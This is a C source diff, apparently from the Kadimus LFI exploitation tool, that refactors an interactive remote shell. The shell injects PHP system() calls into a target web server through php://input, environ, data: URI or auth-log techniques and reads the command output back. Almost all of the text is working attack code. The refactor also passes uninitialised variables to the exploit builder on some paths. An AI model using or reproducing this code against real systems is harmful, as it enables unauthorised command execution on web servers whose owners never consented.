@@ -602,40 +602,44 @@ void exec_phpcode(const char *url, const char *parameter, const char *code, int 
     curl_slist_free_all(chunk);
 }
 
-void rce_http_shell(const char *rce_uri, rce_type tech, const char *p_name){
-    char cmd[1000], ran_str[R_SIZE],
-    **regex_data = NULL, regex[M_ALL_SIZE], *base_uri = NULL;
-    char *aux=NULL;
-    char *php_code, random_file[20], *mmap_str;
-    // php_code[1000+R_SIZE+R_SIZE+23],
+void rce_http_shell(const char *url, const char *parameter, int technique){
+    size_t pos;
     struct parameter_list plist={0};
-    size_t inject_index = 0;
+    char *base, *aux, *phpcode, **match;
+    void *map;
+    size_t mapsize;
+    int fd, len;
+
     struct request body;
-    ssize_t nbytes = 0;
-    FILE *x=NULL;
-    int len = 0, aux_len=0,fd,size_file;
+    CURL *curl;
+    char randomstr[R_SIZE], regex[56], cmd[512], random_file[20];
 
-    CURL *curl=NULL;
+    void *bodyptr;
+    ssize_t nbytes;
 
-    if(tech != AUTH){
-        curl = init_curl(&body);
-    } else {
-        curl = init_curl(NULL);
-    }
+    FILE *fh;
 
-    if(tech != DATA){
-        curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
-    } else {
-        if(!get_element_pos(&plist, &base_uri, rce_uri, p_name, &inject_index)){
-            printf("[-] Parameter: %s not found !!!\n",p_name);
+    if(technique != AUTH)
+        bodyptr = &body;
+    else
+        bodyptr = NULL;
+
+    curl = init_curl(bodyptr);
+
+    if(technique == DATA){
+        if(!get_element_pos(&plist, &base, url, parameter, &pos)){
+            printf("[-] Parameter: %s not found !!!\n", parameter);
             curl_easy_cleanup(curl);
             return;
         }
-
+    } else {
+        curl_easy_setopt(curl, CURLOPT_URL, url);
     }
 
-    random_string(ran_str, R_SIZE);
-    build_regex(regex, ran_str, "(.*)");
+    random_string(randomstr, sizeof(randomstr));
+    build_regex(regex, randomstr, "(.*)");
+
+    aux = xmalloc(600);
 
     while(1){
         printf("(kadimus~shell)> ");
@@ -655,66 +659,52 @@ void rce_http_shell(const char *rce_uri, rce_type tech, const char *p_name){
         if(!strcmp(cmd, "exit"))
             break;
 
-        aux_len = 29+nbytes;
-        aux = xmalloc( aux_len );
-        snprintf(aux, aux_len, "<?php system(\"%s\"); ?>", cmd );
-        php_code = make_code(ran_str, aux, (tech == AUTH) ? true : false);
-        xfree(aux);
+        sprintf(aux, "<?php system(\"%s\"); ?>", cmd);
+        phpcode = make_code(randomstr, aux, (technique == AUTH) ? true : false);
 
-        if(tech != AUTH){
+        if(technique != AUTH){
             init_str(&body);
         } else {
-            if( (x = get_random_file(10, random_file))== NULL )
+            if((fh = get_random_file(10, random_file)) == NULL)
                 die("error while generate random file",0);
 
-            curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)x);
+            curl_easy_setopt(curl, CURLOPT_WRITEDATA, fh);
         }
 
-        if(tech == INPUT)
-            build_rce_exploit(curl, NULL, NULL, 0, INPUT, php_code);
-
-        else if(tech == ENVIRON)
-            build_rce_exploit(curl, NULL, NULL, 0, ENVIRON, php_code);
-
-        else if(tech == DATA)
-            build_rce_exploit(curl, base_uri, &plist, inject_index, DATA, php_code);
-
-        else if(tech == AUTH)
-            build_rce_exploit(curl, NULL, NULL, 0, AUTH, php_code);
+        build_rce_exploit(curl, base, &plist, pos, technique, phpcode);
 
         if(HttpRequest(curl)){
-            if(tech == AUTH){
-                fflush(x);
-                fclose(x);
+            if(technique == AUTH){
+                fclose(fh);
                 fd = readonly(random_file);
-                size_file = get_file_size(fd);
-                mmap_str = (char *) mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);
-                regex_data = regex_extract(regex, mmap_str, size_file, PCRE_DOTALL, &len);
+                mapsize = get_file_size(fd);
+                map = (char *) mmap(0, mapsize, PROT_READ, MAP_PRIVATE, fd, 0);
+                match = regex_extract(regex, map, mapsize, PCRE_DOTALL, &len);
                 close(fd);
-            }
-
-            else {
-                regex_data = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
+                munmap(map, mapsize);
+            } else {
+                match = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
             }
 
             if(len > 0) {
-                printf("%s",regex_data[0]);
-                regex_free(regex_data);
+                printf("%s", match[0]);
+                regex_free(match);
             }
 
         }
 
-        if(tech != AUTH){
-            xfree(body.ptr);
-        } else {
+        if(technique != AUTH)
+            free(body.ptr);
+        else
             unlink(random_file);
-        }
 
-        xfree(php_code);
+        free(phpcode);
     }
 
-    if(tech == DATA){
-        xfree(base_uri);
+    free(aux);
+
+    if(technique == DATA){
+        free(base);
         free(plist.trash);
         free(plist.parameter);
     }
